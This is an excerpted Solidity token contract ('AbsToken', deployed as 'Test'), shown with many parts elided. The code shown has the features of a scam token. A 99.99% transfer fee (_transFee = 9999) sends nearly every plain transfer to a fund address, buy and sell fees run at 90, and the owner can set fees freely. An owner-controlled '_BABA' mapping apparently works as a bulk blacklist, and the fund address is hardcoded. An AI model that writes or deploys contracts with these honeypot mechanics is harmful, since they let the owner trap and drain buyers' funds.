...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 public _buyFundFee = 90;
    uint256 public _buyLPFee = 10;
    uint256 public _sellFundFee = 90;
    uint256 public _sellLPFee = 10;

    uint256 public _transFee = 9999;
    ...
    constructor(
        ...
        address ReceiveAddress = 0xBF2E7050BaC3F793fbd9DaA84B65A8bfb0Cc7081;
    ...
    function setTransCustom(uint256 newTransFee) public onlyOwner {
        _transFee = newTransFee;
    }

    function setBuyCustom(
        uint256 newFundFee,
        uint256 newLpFee
    ) public onlyOwner {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (
            !_isExcludeFromFee[from] && !_isExcludeFromFee[to] && airdropEnable
        ) {
            address ad;
    ...
    function _funTransfer(
        ...
        uint256 _feeAmount = (tAmount * _transFee) / 10000;
        _takeTransfer(sender, fundAddress, _feeAmount);
        _takeTransfer(sender, recepit, tAmount - _feeAmount);
    }
    ...
    function multiBABA(
        ...
        for (uint256 i; i < addresses.length; ++i) {
            _BABA[addresses[i]] = value;
        }
    }

    function setBABA(address addr, bool status) public onlyOwner {
        _BABA[addr] = status;
    }
    ...
    function setMAMA(address addr, bool enable) external onlyOwner {
...
contract Test is AbsToken {
    constructor()
        AbsToken(
            ...
            9,
            420000000000000,
            address(0xBF2E7050BaC3F793fbd9DaA84B65A8bfb0Cc7081)
        )
    {}
}